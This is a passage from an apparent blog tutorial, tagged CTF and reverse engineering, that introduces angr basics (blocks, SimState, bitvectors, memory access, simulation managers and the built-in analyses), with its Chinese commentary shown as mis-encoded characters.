class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">1.</span> To see <span class="hljs-built_in">all</span> the instructions: block.pp()<br>out:<span class="hljs-number">0x401670</span>:       xor     ebp, ebp<br><span class="hljs-number">0x401672</span>:       mov     r9, rdx<br><span class="hljs-number">0x401675</span>:       pop     rsi<br><span class="hljs-number">0x401676</span>:       mov     rdx, rsp<br><span class="hljs-number">0x401679</span>:       <span class="hljs-keyword">and</span>     rsp, <span class="hljs-number">0xfffffffffffffff0</span><br><span class="hljs-number">0x40167d</span>:       push    rax<br><span class="hljs-number">0x40167e</span>:       push    rsp<br><span class="hljs-number">0x40167f</span>:       lea     r8, [rip + <span class="hljs-number">0x2e2a</span>]<br><span class="hljs-number">0x401686</span>:       lea     rcx, [rip + <span class="hljs-number">0x2db3</span>]<br><span class="hljs-number">0x40168d</span>:       lea     rdi, [rip - <span class="hljs-number">0xd4</span>]<br><span class="hljs-number">0x401694</span>:       call    qword ptr [rip + <span class="hljs-number">0x205866</span>]<br><span class="hljs-number">2.</span>The number of the instructions:block.instructions<br><span class="hljs-number">3.</span>The address of the instructions: block.instrutions_addr<br>out:[<span class="hljs-number">0x401670</span>, <span class="hljs-number">0x401672</span>, <span class="hljs-number">0x401675</span>, <span class="hljs-number">0x401676</span>, <span class="hljs-number">0x401679</span>, <span class="hljs-number">0x40167d</span>, <span class="hljs-number">0x40167e</span>, <span class="hljs-number">0x40167f</span>, <span class="hljs-number">0x401686</span>, <span class="hljs-number">0x40168d</span>, <span class="hljs-number">0x401694</span>]<br></code></pre></td></tr></table></figure><h2 id="State-state-proj-factory-entry-state"><a href="#State-state-proj-factory-entry-state" class="headerlink" title="State: state = proj.factory.entry_state()"></a><em>State</em>: <code>state = proj.factory.entry_state()</code></h2><p>Some Examples:</p><blockquote><p>Hereâ€™s another fact about angr - the <code>Project</code> object only represents an â€œinitialization imageâ€ for the program. When youâ€™re performing execution with angr, you are working with a specific object representing a <em>simulated program state</em> - a <code>SimState</code>. Letâ€™s grab one right now!</p></blockquote><p>Projectåªæ˜¯ç¨‹åºçš„ä¸€ä¸ªåˆå§‹æ¡†æ¶ï¼ŒçœŸæ­£ç¬¦å·æ‰§è¡Œçš„æ˜¯ä¸€ä¸ªä¸ª<code>SimState</code>,ç°åœ¨åˆ›å»ºä¸€ä¸ªstate</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs py">state = proj.factory.entry_state()<br>&lt;SimState @ <span class="hljs-number">0x401670</span>&gt;<br></code></pre></td></tr></table></figure><blockquote><p>A SimState contains a programâ€™s memory, registers, filesystem dataâ€¦ any â€œlive dataâ€ that can be changed by execution has a home in the state.</p></blockquote><p>ä¸€ä¸ª<code>state</code>åŒ…å«äº†å¾ˆå¤šçŠ¶æ€ï¼Œæ¯”å¦‚å†…å­˜ã€å¯„å­˜å™¨ã€å„ç§å¯èƒ½æ”¹å˜çš„å€¼éƒ½ä¼šå­˜å‚¨åœ¨stateé‡Œé¢</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><br><span class="hljs-number">1.</span> state.regs.rip <span class="hljs-comment"># get the current instrucion pointer</span><br>out: &lt;BV64 <span class="hljs-number">0x401670</span>&gt;<br><span class="hljs-number">2.</span> state.regs.rax<br>out: &lt;BV64 <span class="hljs-number">0x1c</span>&gt;<br><span class="hljs-number">3.</span> state.mem[proj.entry].<span class="hljs-built_in">int</span>.resolved  <span class="hljs-comment"># interpret the memory at the entry point as a C int</span><br>out: &lt;BV32 <span class="hljs-number">0x8949ed31</span>&gt;<br></code></pre></td></tr></table></figure><p>About <code>bv</code> and <code>bvv</code></p><p><code>bv</code>å°±æ˜¯BitVectorï¼Œangrå­˜å‚¨æ•°æ®çš„å½¢å¼ï¼›<code>bvv</code>å°±æ˜¯BitVector Valueï¼Œä»£è¡¨è¿™ä¸ªä½å‘é‡çš„å€¼</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># bv -&gt; bitvectors to represent CPU data in angr</span><br><span class="hljs-comment"># Note that each bitvector has a .length property describing how wide it is in bits.</span><br><br><span class="hljs-number">1.</span> bv = state.solver.BVV(<span class="hljs-number">0x1234</span>, <span class="hljs-number">32</span>) <span class="hljs-comment"># create a 32-bit-wide bitvector with value 0x1234</span><br>out: &lt;BV32 <span class="hljs-number">0x1234</span>&gt;<br><span class="hljs-number">2.</span> state.solver.<span class="hljs-built_in">eval</span>(bv)                <span class="hljs-comment"># convert to Python int</span><br>out: <span class="hljs-number">0x1234</span><br></code></pre></td></tr></table></figure><p>å­˜å‚¨ <code>bitvectors</code> åˆ° <code>reg</code> or <code>mem</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">1.</span>state.regs.rsi = state.solver.BVV(<span class="hljs-number">3</span>, <span class="hljs-number">64</span>)<br>  state.regs.rsi<br>out: &lt;BV64 <span class="hljs-number">0x3</span>&gt;<br><br><span class="hljs-number">2.</span>state.mem[<span class="hljs-number">0x1000</span>].long = <span class="hljs-number">4</span><br>state.mem[<span class="hljs-number">0x1000</span>].long.resolved<br>out:&lt;BV64 <span class="hljs-number">0x4</span>&gt;<br></code></pre></td></tr></table></figure><p>About <code>mem</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">1.</span>Use array[index] notation to specify an address<br><br><span class="hljs-number">2.</span>Use .&lt;<span class="hljs-built_in">type</span>&gt; to specify that the memory should be interpreted <span class="hljs-keyword">as</span> &amp;lt;<span class="hljs-built_in">type</span>&amp;gt; (common values: char, short, <span class="hljs-built_in">int</span>, long, size_t, uint8_t, uint16_tâ€¦)<br><br>From there, you can either:<br><br> <span class="hljs-number">1</span>Ëš Store a value to it, either a bitvector <span class="hljs-keyword">or</span> a Python <span class="hljs-built_in">int</span><br><br> <span class="hljs-number">2</span>Ëš Use .resolved to get the value <span class="hljs-keyword">as</span> a bitvector<br><br> <span class="hljs-number">3</span>Ëš Use .concrete to get the value <span class="hljs-keyword">as</span> a Python <span class="hljs-built_in">int</span><br></code></pre></td></tr></table></figure><h2 id="Simulation-Managers"><a href="#Simulation-Managers" class="headerlink" title="Simulation Managers"></a><em>Simulation Managers</em></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">1.</span> simgr = proj.factory.simulation_manager(state)<br><span class="hljs-comment">#  The constructor can take a state or a list of states.</span><br>out: &lt;SimulationManager <span class="hljs-keyword">with</span> <span class="hljs-number">1</span> active&gt;<br><br><span class="hljs-number">2.</span> simgr.step()<br><span class="hljs-comment"># è¿™ä¸ªstepä¼šè¿›å…¥blockçš„ä¸‹ä¸ªå—ï¼Œå¦‚æœæœ‰åˆ†æ”¯ï¼Œé‚£ä¹ˆangréƒ½ä¼šè¿›å…¥ï¼Œåé¢çš„æ–‡ç« ä¼šå†æåŠ</span><br></code></pre></td></tr></table></figure><h2 id="Analyses"><a href="#Analyses" class="headerlink" title="Analyses"></a><em><strong>Analyses</strong></em></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># ange has lots of built-in analyses</span><br> proj.analyses.BackwardSlice        proj.analyses.CongruencyCheck      proj.analyses.reload_analyses<br> proj.analyses.BinaryOptimizer      proj.analyses.DDG                  proj.analyses.StaticHooker<br> proj.analyses.BinDiff              proj.analyses.DFG                  proj.analyses.VariableRecovery<br> proj.analyses.BoyScout             proj.analyses.Disassembly          proj.analyses.VariableRecoveryFast<br> proj.analyses.CDG                  proj.analyses.GirlScout            proj.analyses.Veritesting<br> proj.analyses.CFG                  proj.analyses.Identifier           proj.analyses.VFG<br> proj.analyses.CFGEmulated          proj.analyses.LoopFinder           proj.analyses.VSA_DDG<br> proj.analyses.CFGFast              proj.analyses.Reassembler<br></code></pre></td></tr></table></figure><p>for information about these methods, we should check <code>api documention angr.analyses</code></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Reverse</category>
      
      <category>angr</category>
      
    </categories>
    
    
    <tags>
      
      <tag>reverse</tag>
      
      <tag>angr</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
